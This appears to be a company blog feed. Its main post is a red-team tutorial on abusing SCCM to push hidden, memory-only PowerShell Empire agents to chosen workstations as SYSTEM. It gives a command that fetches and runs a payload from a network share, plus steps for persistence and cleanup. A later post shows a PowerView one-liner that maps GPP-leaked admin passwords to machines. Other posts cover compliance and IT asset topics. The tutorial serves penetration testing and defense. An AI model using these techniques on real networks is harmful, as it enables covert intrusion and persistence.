				<content:encoded><![CDATA[<p><strong>Author: Matt Nelson, Adaptive Threat Division </strong></p>
<p>In most Red Team engagements, strategic lateral movement is a must. Unlike a lot of typical network penetration tests, a Red Team engagement often requires stealth, creativity and <strong>a very limited number of hosts touched on the network</strong>. Most Red Teams have their “go to” method for moving laterally within a target network in a surgical manner. Some teams get caught up in their normal tradecraft and tend to overlook other creative ways to clinically dissect a network during the hunt for the crown jewels. This post will cover a non-traditional way to strategically target and compromise computers by abusing Microsoft’s System Center Configuration Manager, more commonly known as SCCM.</p>
<p>If you aren’t familiar with <a href="https://twitter.com/hackingdave">Dave Kennedy</a>’s talk on compromising a SCCM server and deploying malware enterprise wide, you can read about it <a href="https://www.trustedsec.com/files/Owning_One_Rule_All_v2.pdf">here</a>.</p>
<p><strong>What is SCCM?</strong></p>
<p>TL;DR, SCCM is a platform that allows for an enterprise to package and deploy operating systems, software, and software updates. It allows for IT staff to script and push out installations to clients in an automated manner. You can kind of think of it as a customizable, scriptable WSUS. There’s more information about SCCM <a href="https://en.wikipedia.org/wiki/System_Center_Configuration_Manager">here</a>.</p>
<p>If you can gain access to SCCM, it makes for a great attack platform. It heavily integrates Windows PowerShell, has excellent network visibility, and has a number of SCCM clients as SYSTEM just waiting to execute your code as SYSTEM.</p>
<p><strong>Preface</strong></p>
<p>This post will assume that you have the ability to identify and compromise a SCCM installation. In most situations, this will likely involve compromising an elevated account (such as a server administrator) that allows for access to the SCCM server itself. This type of attack is handy in situations where you have elevated credentials (either domain or local) to select servers, but not all workstations. This is often the case in enterprises with good group separation and control over local administrative accounts in the domain.</p>
<p><strong>Using SCCM to Select a Target</strong></p>
<p>Often times, using RDP to access a resource as a Red Team can be very useful, but also somewhat risky. In most situations as an operator, you have to weigh the risk versus the reward. For this attack, RDP will be used to access the Configuration Manager Console on the SCCM server. When you get in and start the Configuration Manager Console, it will look something like this:</p>
<p><img class="alignleft size-full wp-image-7297" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog1-e1445962067500.png" alt="Targeted Workstation Compromise with SCCM blog1" width="1000" height="625" /></p>
<p>Most organizations will setup SCCM to “clone” Active Directory in order to pull in computer objects by using a Discovery Method referred to as “Active Directory System Discovery”, as well as user objects by using the discovery method “Active Directory User Discovery”. These discovery methods will enumerate computer and user objects based on a supplied container or LDAP query. Within this structure, there are a few ways that SCCM correlates which users use what computer. The most common is implementing “User Device Affinity” or setting the “Primary User” for a computer object. Whichever it may be, IT staff needs a way to map what computers belong to what people. By doing so, they are able to push specific software out to a specific person or group of people. In many cases, an organization will create “Device Collections”, which are containers for specific purposes. By throwing computer objects into a Device Collection, IT is able to push specific software out to that specific group (for example, pushing out QuickBooks to the Finance Department).</p>
<p>Since there is usually a nice user-to-device mapping within SCCM, we can go to “All Users” and find a nice list of users. This allows you to determine whom you want to target and determine what computer they are on (if they have mapping setup). For this example, we are going to target the user “Chris”. Below is an example of what the user list will look like. As you can see, there is an object called “Primary Device”. Clicking on this will pull up the computer object that the selected user owns. It is important to note that there are a few different ways to do user-&gt;device mapping in SCCM. It is up to you to determine how the mapping is setup in order to identify your targets.</p>
<p><img class="alignleft size-full wp-image-7298" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog2-e1445962143912.png" alt="Targeted Workstation Compromise with SCCM blog2" width="1000" height="391" /></p>
<p>With this information, we now know that the user “Chris” owns “CORPWKSTNX64”.</p>
<p><img class="alignleft size-full wp-image-7299" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog3-e1445962257900.png" alt="Targeted Workstation Compromise with SCCM blog3" width="1000" height="231" /></p>
<p>Another way to target a specific user or group of users is to identify the computer names of your targets. This can often be acquired by conducting a little network recon. One common method of identifying targets is to use Invoke-UserHunter from <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a> (written by my co-worker <a href="https://twitter.com/harmj0y">@harmj0y</a>). You can read a bit about user hunting on his blog <a href="http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/">here</a>. Organizations often have some sort of naming scheme for their computers or they have some sort of identifiable information in Active Directory. After all, IT staff likely needs to know what users are on what computers for support requests. If you identify your targets, you can create a group just for them. This will allow you to create your target set, group them all together, and push agents to them simultaneously.</p>
<p>You can accomplish this by going to the “Assets and Compliance” tab and clicking on “Device Collections”. This will bring up any device collections that have already been created. You can create your own by right clicking and selecting “Create Device Collection” and giving the collection a name. It will also ask you to specify a limiting collection. Normally, you want to set this to “All Systems”. This will limit what computers are available to be added to the collection.</p>
<p><img class="alignleft size-full wp-image-7300" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog4-e1445962350206.png" alt="Targeted Workstation Compromise with SCCM blog4" width="1000" height="915" /></p>
<p>Hitting “Next” will take you to the screen that allows you to specify membership rules. You can either create membership rules now and add your targets, or you can just click “Next” and “OK” on the warning to move on. I often just click through this section and opt to add my targets to the collection later. After all this is done, you will have a collection for your specific targets.</p>
<p>You can then add your targets to your target collection by clicking on “All Systems” and typing or finding the computer names you wish to specifically target.</p>
<p><img class="alignleft size-full wp-image-7301" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog5-e1445962407387.png" alt="Targeted Workstation Compromise with SCCM blog5" width="1000" height="519" /></p>
<p>When you find a target computer, just right click on it and select “Add Selected Items” -&gt; “Add Selected Items to Existing Device Collection”.</p>
<p><img class="alignleft size-full wp-image-7302" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog6-e1445962499458.png" alt="Targeted Workstation Compromise with SCCM blog6" width="1000" height="597" /></p>
<p>From there, just select your device collection and click “OK”. You can click “Device Collections” on the left, and then double click on your device collection to make sure your targets are in the collection before deploying your payload.</p>
<p><img class="alignleft size-full wp-image-7303" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog7-e1445962614651.png" alt="Targeted Workstation Compromise with SCCM blog7" width="1000" height="283" /></p>
<p>By strategically selecting your targets and placing them into a device collection, you are able to deploy your payload in a controlled and surgical manner.</p>
<p><strong>Using SCCM Application Deployments for Targeted Workstation Compromise</strong></p>
<p>The easiest way to abuse SCCM’s functionality without touching disk on your targets is to host your payload on the SCCM server and use PowerShell to grab the payload and execute it. In most situations, SCCM admins will create a publicly available share to host the software packages. In some situations, you may need to browse around to see how they are hosting installation files. Administrators will typically place all installation files in a predictable folder (all Flash installation files in Flash_15.0.0.1, for example). When they create a new package or application and push it to the clients, the client will often download the files, run the installation script and then delete the files off of disk. This is fine for normal administrative tasks, but it isn’t ideal when being used in a malicious context. To avoid touching disk on the client, we will use a method to fetch the payload content over UNC.</p>
<p>The first step is to host our payload. For this example, I will be using <a href="http://www.PowerShellEmpire.com/">PowerShell Empire</a> by generating a .ps1. Once generated, you can copy the contents into a text file and host it on a reachable share. In this instance, the hosting folder is “sccmsource” and the stager will be “Install.txt” in the “LegitApplication” folder. So, the complete path to our Empire staging code will be “\\sccm2012.lab.local\sccmsource\LegitApplication\Install.txt”. A nice aspect of SCCM is that it can be heavily administered via PowerShell, which makes malicious PowerShell less obvious.</p>
<p><img class="alignleft size-full wp-image-7304" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog8-e1445962676902.png" alt="Targeted Workstation Compromise with SCCM blog8" width="1000" height="337" /></p>
<p>With our payload hosted, we can now begin to create our application for deployment to select targets throughout the network. To do so, select the “Software Library” tab and then select “Application Management”. From there, right click and select “Create Application”. After doing so, you will be presented with a box to start the creation process.</p>
<p>The first box will ask you to either specify the application install type or to manually specify the application install type. For this, we are going to select “Manually specify the application information” and then hit next.</p>
<p><img class="alignleft size-full wp-image-7305" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog9-e1445962731450.png" alt="Targeted Workstation Compromise with SCCM blog9" width="1000" height="888" /></p>
<p>On the next screen, we need to give our application a name and provide a little bit of information. Once provided, hit next until you see the “Deployment Types” section (you can skip the “Application Catalog” section unless you need to add in any additional information). For our purpose, the less information provided, the better.</p>
<p><img class="alignleft size-full wp-image-7306" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog10-e1445962834971.png" alt="Targeted Workstation Compromise with SCCM blog10" width="1000" height="886" /></p>
<p>Once you reach the “Deployment Types” section, click “Add” to add a new deployment type. Doing so will open a window that will get you started on configuring your application.</p>
<p>Under the “Type” section, we are going to select the “Script Installer” option.</p>
<p><img class="alignleft size-full wp-image-7307" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog11-e1445962912407.png" alt="Targeted Workstation Compromise with SCCM blog11" width="1000" height="776" /></p>
<p>Hitting next will move you on to the “General Information” screen. This is where you will enter a deployment name and language. I normally use the same name as the application.</p>
<p><img class="alignleft size-full wp-image-7308" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog12-e1445963089100.png" alt="Targeted Workstation Compromise with SCCM blog12" width="1000" height="878" /></p>
<p>Clicking on next will move us to the most important part of the application creation…the payload. For this section, we are going to leave the “Content Location” field empty. In normal cases, this is where an Administrator would specify the location of the application installation files. Since we want to avoid touching disk, we will leave that blank.</p>
<p>This brings us to the “Installation Program” and “Installation start in” fields. This is where we are going to place the command that will grab our payload and execute it. The “Installation Program” will look something like this:<br />
<em>cmd.exe /c &#8220;powershell.exe -ep bypass -c &#8220;gc \\serverName\sharedFolder\ApplicationFolder\payload.txt | iex&#8221;&#8221;</em>.</p>
<p><strong>Note: </strong>you may be wondering why we don’t just set the “Installation Program” to be a PowerShell encoded command with the payload text. This is because SCCM unfortunately imposes a length restriction limit of 1024 characters for the specified program. You could potentially use a trimmed IEX “download cradle”, but you’ll likely hit the length restriction if you want to include things like proxy enumeration or a user-agent with it. Also, it’s nice to keep the reach back from the client confined to ‘normal’ behavior (e.g. UNC path execution instead of HTTP).</p>
<p>Once we have the program set, we need to specify where the installation is going to start in. Since the “Installation Program” field took only “cmd.exe”, SCCM is asking us to specify the location of “cmd.exe”. So for that field, we are going to put “C:\Windows\System32”.</p>
<p><img class="alignleft size-full wp-image-7309" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog13-e1445963140313.png" alt="Targeted Workstation Compromise with SCCM blog13" width="1000" height="883" /></p>
<p>What this will do is use cmd.exe to start PowerShell, and then use PowerShell’s Get-Content (gc) to reach out to “\\sccm2012\sccmsource\LegitApplication” and grab the contents of “Install.txt”. Once it has that, the code is passed to Invoke-Expression (iex) to execute it. This allows us to execute our payload on the target without dropping a file to the file system.</p>
<p>With that configured, we can proceed to the “Detection Method” menu. The options specified here will tell SCCM how to determine if the client already has the target application installed or not. SCCM will check the specified options before installing the application in order to prevent multiple installations. Since we are running our payload in memory there isn’t really much to check, but as this part is required, we can just populate it with bogus information.</p>
<p>To do this, click “Add Clause” and change the type to “Folder”. I normally just set the path to “C:\” and the “File or Folder Name” to random text. Once you have that set, make sure you specify “The file system setting must exist on the target system to indicate presence of this application”.</p>
<p><img class="alignleft size-full wp-image-7310" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog14-e1445963235557.png" alt="Targeted Workstation Compromise with SCCM blog14" width="1000" height="987" /></p>
<p>With that set, we can click “OK” and “Next” to move onto the “User Experience” section. This lets you dictate how silent you want the installation to be, as well as what context you want the installation to take place (userland or system). For this example, we are going to set the “Installation Behavior” to “Install for System”. We are then going to make sure we can push our agent regardless if the user is logged on or not, allowing us to push agents in the middle of the night if needed. Finally, we want to make sure to set the “Installation Program Visibility” to “Hidden”. This will hide any and all things from the user. <img src="http://www.verisgroup.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p><img class="alignleft size-full wp-image-7311" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog15-e1445963348683.png" alt="Targeted Workstation Compromise with SCCM blog15" width="1000" height="881" /></p>
<p>Once done, we can hit “Next” through the “Requirements” and “Dependencies” sections. With that done, we now have our malicious application created. Next step, deployment! To deploy our newly created application, just right click on it and select “Deploy”.</p>
<p><img class="alignleft size-full wp-image-7312" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog16-e1445963418981.png" alt="Targeted Workstation Compromise with SCCM blog16" width="1000" height="764" /></p>
<p>This will bring us to the screen to specify our targets. Clicking on “Browse” next to “Collection” will bring up all of the user and device collections that exist. You can either deploy to a specific user (if a user collection for them exists) or you can deploy to a specific device collection. You can click the “User Collection” drop down to move in between user and device collections.</p>
<p><img class="alignleft size-full wp-image-7313" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog17-e1445963542469.png" alt="Targeted Workstation Compromise with SCCM blog17" width="1000" height="677" /></p>
<p>Once you have your collection selected, clicking “OK” will move you onto the remainder of the deployment setup. You will want to skip the “Content” section and click “Next” until you reach the “Deployment Settings” portion. In this section, you want to set the “Purpose” field to “Required”.</p>
<p><img class="alignleft size-full wp-image-7314" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog18-e1445963670881.png" alt="Targeted Workstation Compromise with SCCM blog18" width="1000" height="860" /></p>
<p>Clicking “Next” will take you to the scheduling section. All you have to do on that page is make sure the “Installation Deadline” is set to “As soon as possible after the available time” (which is set by default).</p>
<p>On the next page, you will find the settings for the user experience. Here, you want to make sure you set the “User notifications” to “Hide in Software Center and all notifications”.</p>
<p><img class="alignleft size-full wp-image-7315" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog19-e1445963777950.png" alt="Targeted Workstation Compromise with SCCM blog19" width="1000" height="861" /></p>
<p>Once done, you can click through the “Alerts” section and finish the deployment. This will push the application out to the computers in the device collection specified. You can verify the deployment by clicking on the application and looking at the deployments on the bottom.</p>
<p><img class="alignleft size-full wp-image-7316" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog20-e1445963899679.png" alt="Targeted Workstation Compromise with SCCM blog20" width="1000" height="414" /></p>
<p>Once a target checks in, it will detect that it has a new deployment pushed to it and it will try to install the application. Since we simply provided commands to run via the command prompt, it will start PowerShell, grab the content of our payload off of the SCCM server, and then execute it. In this example, we get a SYSTEM level Empire agent back:</p>
<p><img class="alignleft size-full wp-image-7317" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog21-e1445964052991.png" alt="Targeted Workstation Compromise with SCCM blog21" width="1000" height="394" /></p>
<p>Once you get agents on the targets, I highly recommend that you delete the deployment, the application, and the device collection that was created.</p>
<p><strong>Alternate Method of Code Execution</strong></p>
<p>Say you don’t want to put your payload up on a share in order to abuse the “Get-Content | iex” method previously mentioned. Another option is to abuse the “Use a custom script to detect the presence of this deployment type” functionality. This allows you to specify custom code (either in PowerShell, VBScript or Jscript) that will be executed at the very beginning of the deployment during the installation check phase.</p>
<p><strong>Note</strong>: The code in the script detection portion does NOT run as SYSTEM, but rather in userland. SCCM also drops the script into C:\Windows\CCM\SystemTemp, executes it and then deletes it. Because of this, it will leave a forensic artifact on disk.</p>
<p>To do this, follow the instructions above for creating an application. Once you reach the “Content” portion, you can put garbage in the “Installation Program” field and leave the “Installation start in” field blank:</p>
<p><img class="alignleft size-full wp-image-7318" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog22-e1445964137650.png" alt="Targeted Workstation Compromise with SCCM blog22" width="1000" height="234" /></p>
<p>When you get to the “Detection Method” portion, select “Use a custom script to detect the presence of this deployment type” and click “Edit”. This will open the prompt to put in your custom code (our payload). SCCM does require that PowerShell scripts be digitally signed, so any PowerShell code pasted in the custom script box will not be executed unless there’s a digital signature. If you attempt to bypass execution policy (powershell.exe –ep bypass –c “code”) it will still fail. This is because SCCM takes the content of the script you provided, writes it to a .ps1 on the target and tries to execute it, so the system’s default ExecutionPolicy will apply.</p>
<p>To bypass this, we can use VBScript to execute our PowerShell payload. The code to put in the script box will look something like this:</p>
<p><img class="alignleft size-full wp-image-7319" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Targeted-Workstation-Compromise-with-SCCM-blog23-e1445964212939.png" alt="Targeted Workstation Compromise with SCCM blog23" width="1000" height="1006" /></p>
<p>You can find the VBScript wrapper code <a href="https://github.com/enigma0x3/Misc/blob/master/VBScriptWrapper.vbs">here</a>. This is essentially a VBScript wrapper that executes a PowerShell Empire stager. You can replace “objProcess.Create “code”” with whatever PowerShell code you would like. You can then proceed to finish creating and deploying the application. When the client grabs the application, it will run this VBScript first and execute our payload in user level context.</p>
<p><strong>Persistence</strong></p>
<p>Another amazing feature about SCCM is that it will grab the application and execute it after a reboot. As long as the application we created is deployed to our targets, it will execute our payload when it checks in after a reboot. Because of this, we have persistence on our target group of computers without needing to drop a file to disk, or utilize any of the traditional persistence methods.</p>
<p><strong>Recap</strong></p>
<p>As an attacker, you can abuse SCCM to scope out targets on the network, group selected targets together, and push out a memory only agent to those selected targets simultaneously as either a normal user, or as SYSTEM. SCCM is often a “Management Point” for most (if not all) workstations in the enterprise, and because of this, the SCCM server will often have great, if not complete visibility into the entire network. SCCM clients will also re-execute our payload after a reboot, allowing us to remain persistent on a machine without dropping a file to disk. Because of these features, SCCM makes for a great platform to silently push agents out to select workstations without the need to use normal lateral movement methods.</p>

A major overlooked function within both enterprises and commercial organizations is IT Asset Management as it relates to cybersecurity. In particular, this series hones in on the dangers of Shadow IT, and how an organization through its security program can support network visibility to bring light to unknown IT.</p>
<p><strong>Cybersecurity through Visibility</strong></p>
<p>What is on your network?</p>
<p>If you were asked this question, how would you answer it? You could prioritize the data you may have on your network (customer, employee, financial, health), pinpoint some key servers or Critical Business Assets (CBAs), and maybe even show your latest scan or inventory. But network activity is not at the pace of human processes, compliance, inventories, or engineering; it is at wire speed. The wire speed of cybersecurity threats demands cybersecurity automation that leverages accurate detection of what is on the network. Thorough cybersecurity detection is only possible through network visibility.</p>
<p>Shadow IT is technology that pervades your network visibility. Translated to human speak, it means technology (hardware or software) you simply <em>do not know</em> is on your network. These could be devices that have any type of access, any software, and are communicating to anywhere a firewall would let it. Due to the undetected nature, it will not be seen by security tools or technologies simply because the asset information used to configure those tools is limited. The competition, external threat actors, audited IT groups, as well as insider threats all appreciate the ability to leverage your network undetected. However, there is another way to do business.</p>
<p>How can security be managed, let alone measured, and how can cybersecurity detection take place if none of the tools or processes know where to look?</p>
<p><strong>Bringing IT out of the Shadows</strong></p>
<p>To shed light on the IT you <em>do not know</em> is on your network, you have to leverage existing tools and processes to analyze what is on your network to compare to what should be on your network. This can be performed through a combination of analysis, cyber process improvement, re-configurations, and careful re-use of tools. Shadow IT is connected to your other assets via your corporate or organization’s network, and encompasses the shadow devices, software, firmware, and <img class="alignright size-full wp-image-7275" style="padding-top: 20px;" src="http://www.verisgroup.com/wp-content/uploads/2015/10/Shadow-IT-blog2.png" alt="Shadow IT blog2" width="245" height="109" />the configurations of those systems and respective applications residing on those devices. It may take the governance of another organization outside of IT, such as a Security Operations group to maintain a security-focused mindset on network visibility beyond outdated asset lists and limited scanning.</p>
<p>Often Shadow IT exists due to a variety of organizational and process factors in addition to the technical. Slow implementation processes, inability to leverage cloud, and lack of communication across IT and business groups all allow a certain place for Shadow IT to lurk on the network. Ultimately, this can result in a breakdown of IT acquisition and implementation responsibilities and processes, and may even lead to regulatory failures and possible data breaches.</p>
<p><strong>Is Network Visibility worth it?</strong></p>
<p>Installing yet another enterprise security tool on your network might not be feasible. And the subject of Asset Management itself might not necessarily be rousing, given the domain specific tools that are buzzworthy (the next best malware detection, next generation firewalls, etc.). However, there are ways to know if improving network visibility is worth making a business case for. On a budget, it makes sense to scan baseline configurations of standard desktop, laptop, and server VMs to understand how a known IT asset could be vulnerable to <em>unknown</em> IT assets. Additionally, comparing what you expect to be on the network (e.g. IT inventories) to what you detect on the network can explain quite plainly if the problem is big enough to explore the shadows.</p>
<p>Consultants, subject-matter experts, engineers, and architects can work with you in a collaborative fashion to develop a technical architecture and governance framework to build Asset Management into your cybersecurity program. The framework may involve repurposing existing Asset Management tools to incorporate a technical process for tracking these applications, including critical attributes and links to other databases and CBAs, and institute an automated process for maintaining the accuracy of the Asset Management system. This enables an organization to reduce information risk and strengthen data integrity by effectively identifying, inventorying, and governing devices and applications not directly managed by IT in near real-time.</p>
<p>Often Shadow IT can arise from the central IT organization not having the necessary resources to support specific business needs. While the business line may have unique requirements that necessitate an outside vendor or service, IT efforts need to be aligned with the long-term IT and cybersecurity strategy of the company. An organization needs to balance limited resources in order to improve the company’s overall security. However, ignoring the unknowns on your network or having immature IT Asset Management may not be worth the risk.</p>

				<content:encoded><![CDATA[<p><strong>BYOD workplaces are convenient and improve productivity, but employees need to take steps to ensure sensitive data is protected</strong>.</p>
<p>Business today is often done on the go. The ability to work from anywhere has driven a shift from company-issued devices to the integration of personal devices—called &#8220;bring your own device,&#8221; or BYOD—into the workplace.</p>
<p>But over the past decade, the capabilities of the devices have shifted. Now, the very innovation that makes it possible to use devices to work from anywhere also pose new threats ranging from lost and stolen devices to breaches and malware. As an employee, here are eight things you can do to protect your employer—and yourself—from BYOD-enabled threats.</p>
<p><strong>1. Know Your Company’s Policy</strong></p>
<p>Whether it’s a formal document or an informal set of rules of thumb, be sure to connect with the person who manages your company’s IT to get familiar with your organization’s BYOD dos and don’ts, says Adam Salerno, manager of federal accounts at cybersecurity consultancy Veris Group in Vienna, Virginia. It’s basic advice, but the IT department will likely give you a list of precautions and may have tools that you can install on your phone to keep data safe.</p>

<p>A few months ago, <a href="https://twitter.com/passingthehash">Skip Duckwall</a> asked me if it was possible, through PowerView, to enumerate what organizational units a particular group policy Globally Unique Identifier (GUID) applied to. Say you have a GUID from a Group Policy Object (e.g. from the results of PowerSploit&#8217;s <a href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a>). Knowing exactly what OUs (and then what machines) this policy applies to can really help speed up lateral spread! This is something I wished I had thought of, and I quickly integrated the functionality into PowerView. This post covers a quick demonstration of this new approach using <a href="http://www.harmj0y.net/blog/redteaming/powerview-2-0/">PowerView&#8217;s recent 2.0 rewrite</a>.</p>
<p>When you run <strong>Get-GPPPassword,</strong> you&#8217;ll get output like this (screenshot taken directly from <a href="https://twitter.com/obscuresec">@obscuresec</a>&#8216;s <a href="http://obscuresecurity.blogspot.com/2013/07/get-gpppassword.html">blog post on the subject</a>):</p>
<p><img class="alignleft size-full wp-image-7243" src="http://www.verisgroup.com/wp-content/uploads/2015/10/PowerView-and-GPP-blog.png" alt="PowerView and GPP blog" width="987" height="450" /></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>You&#8217;ll see in the <strong>File</strong> path returned includes the GUID for the policy (in this case &#8220;{31B2F340-016D-11D2-945F-00C04FB984F9}&#8221;). In PowerView 2.0, you can now take that GUID and easily enumerate the OUs it&#8217;s applied to by running <strong>Get-NetOU -GUID &lt;GPP_GUID&gt;</strong> (this just queries for OU objects with a matching GUID in the <a href="https://msdn.microsoft.com/en-us/library/cc219956.aspx">gPLink attribute</a>). We can then take those OU results and feed them into <strong>Get-NetComputer</strong> by running <strong>Get-NetComputer -ADSpath &lt;OUPath&gt;</strong>. This will return all of the computer names in Active Directory that have the policy applied through an OU, and therefore, have a local administrator password set to the discovered GPP values!</p>
<p style="line-height: 18.0pt;">If you want complete computer objects/information, you can use the -FullData flag with <strong>Get-NetComputer</strong>. The -FullData also works with <strong>Get-NetOU</strong> if you would like more complete OU information. Here&#8217;s how it can look all in a single one-liner to get all machines a particular GPP GUID (like the one in our example) applies to:</p>
<p><em>Get-NetOU -GUID &#8220;{31B2F340-016D-11D2-945F-00C04FB984F9}&#8221; | %{ Get-NetComputer -ADSPath $_ }</em></p>
<p>The newly christened <strong>Get-NetSite</strong> function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This functionality has definitely saved us time on a few engagements, and hopefully, others find it of use.</p>

White Hat USA was organized in 2012 with the goal of raising money to help children at risk while providing networking opportunities for members of the cybersecurity community. In its first two years, the White Hat Gala has raised nearly $750,000 in support of Children’s National Health System, and the children and families it serves. With the help of corporations and individuals within the cybersecurity industry, the event has grown into a great success.</p>
<p>Funds raised at the White Hat Gala go directly to providing the vital support Children’s National Health System needs to give the best pediatric care for patients, families, and the community. Children’s National is re-imagining care for children by finding better ways to prevent, treat, and cure different childhood conditions. To achieve that goal, they are recruiting the best and brightest faculty, expanding programs, and updating facilities to provide the most innovative care to patients and access to the same level of world-class care for every child. With a global reach, Children’s National has treated children from 50 states and 40 countries around the world.</p>
<p>The event will take place on Thursday, October 22, 2015, at the Andrew W. Mellon Auditorium in Washington, DC. Visit the <a href="http://giving.childrensnational.org/site/PageServer?pagename=14wh_homepage">White Hat Gala website</a> for more information.</p>

				<content:encoded><![CDATA[<p><strong>Mega Data Centers Reaffirm Ability to Meet High U.S. Government Security Requirements</strong></p>
<p>QTS, a leading provider of data center facilities and cloud services, has received Federal Information Security Management Act (FISMA) High Authorization and Accreditation at its Richmond and Atlanta-Metro data centers for physical and environmental services. FISMA requires each federal agency to develop, document and implement an agency-wide program to provide security for the information systems and data that support its operations, including the systems of government contractors.</p>
<p>QTS&#8217; custom data center and colocation services at its Richmond and Atlanta-Metro mega data centers were tested under the latest version of FISMA. Veris Group, a leading third party assessment organization (3PAO), worked with QTS&#8217; internal compliance team to audit both facilities&#8217; operations.</p>

<p>There are three routes that a Cloud Servicer Provider (CSP) may take to obtain a FedRAMP certified environment. The three routes are:</p>
<ol>
<li>Certification through the FedRAMP Joint Authorization Board (JAB)</li>
<li>Certification through an Agency</li>
<li>Cloud Service Provider (CSP) Self Certification through Supplied Testing to Third Party Assessment Organization (3PAO) and General Services Administration (GSA) Program Management Office (PMO)</li>
</ol>
<p>Even though all three paths make use of independent 3PAOs, there are subtle differences that CSPs should understand and weigh before making the decision as to which route is best for their cloud environment. The information in <a href="http://www.verisgroup.com/wp-content/uploads/2015/10/Understanding-FedRAMP-Accreditation-Paths-white-paper.pdf">this white paper</a> provides an explanation for each route, Veris Group’s role in each route, and the reasons why one route may be more beneficial to your company than another.</p>

				<content:encoded><![CDATA[<p><a href="https://www.federalregister.gov/articles/2015/08/26/2015-20870/defense-federal-acquisition-regulation-supplement-network-penetration-reporting-and-contracting-for"><img class="alignleft size-full wp-image-7182" src="http://www.verisgroup.com/wp-content/uploads/2015/10/DFARS-e1444828823971.png" alt="DFARS" width="150" height="150" /></a>The DoD recently issued an interim rule for contractor compliance obligations related to cybersecurity regulations revising and expanding on the previous DFARS 252.204-7012. Citing an urgent need to: 1) protect defense information, 2) understand cyberattacks against defense contractors, and 3) reduce cloud computing attack vulnerabilities, the DoD wants prime contractors and their subs to ensure “adequate security” commensurate with the consequences and probability of loss, misuse, or unauthorized access to, or modification of, controlled unclassified information (CUI). According to the interim rule, to keep CUI secure, guidelines were updated for protecting the CUI on systems outside the immediate control of the federal government.</p>
<p>The highlights of those guideline changes (and the interim rule) are as follows:</p>
<ul>
<li>DFARS 252.204-7012 has been renamed “Safeguarding Covered Defense Information and Cyber Incident Reporting”.</li>
</ul>
<ul>
<li>The table of security controls based on NIST SP 800-53 is replaced by NIST SP 800-171, <em>Protecting Controlled Unclassified Information in Nonfederal Information Systems and Organizations</em>. By eliminating federal-centric processes and requirements inherent in NIST SP 800-53, NIST SP 800-171 is specifically designed for contractors to increase the protection of sensitive information residing outside of the control of the federal government while reducing contractor burden.</li>
</ul>
<ul>
<li>Defense Federal Acquisition Regulation Supplement (DFARS) subpart 204.73 is modified to expand safeguarding and reporting policy to require protection of covered defense information, which includes controlled technical information, export controlled information, critical information, and other information requiring protection by law, regulation, or government-wide policy.</li>
</ul>
<ul>
<li>Scope of 252.204-7012 is expanded to include the safeguarding of covered defense information and require contractors to report cyber incidents under the new class of information as well as any cyber incidents that may affect the ability to provide operationally critical support.</li>
</ul>
<ul>
<li>A new provision in 252.204-7008 allows for offerors to be aware of the requirements of 252.204-7012 and, if a process is not applicable, why the process is N/A or how the process is compensated through alternative measures.</li>
</ul>
<ul>
<li>New clause in 252.204-7009 helps protect and limit the use and disclosure of third-party contractor reported cyber incident information submitted to the DoD in response to a cyber incident.</li>
</ul>
<ul>
<li>New DFARS subpart 239.76 was added that discusses various terms, conditions, and other requirements for cloud service acquisitions, including data locations and requirements of a provisional authorization under Defense Information Systems Agency (DISA) standards.</li>
</ul>
<ul>
<li>A new clause at 252.239-7010 provides standard contract language for the acquisition of cloud computing services including access, security, and reporting requirements.</li>
</ul>
<p>Comments are available for the interim rule until October 23, 2015. The interim rule and comment form can be found <a href="https://federalregister.gov/a/2015-20870">here</a>. The new NIST SP 800-171 can be found <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-171.pdf">here</a>.</p>
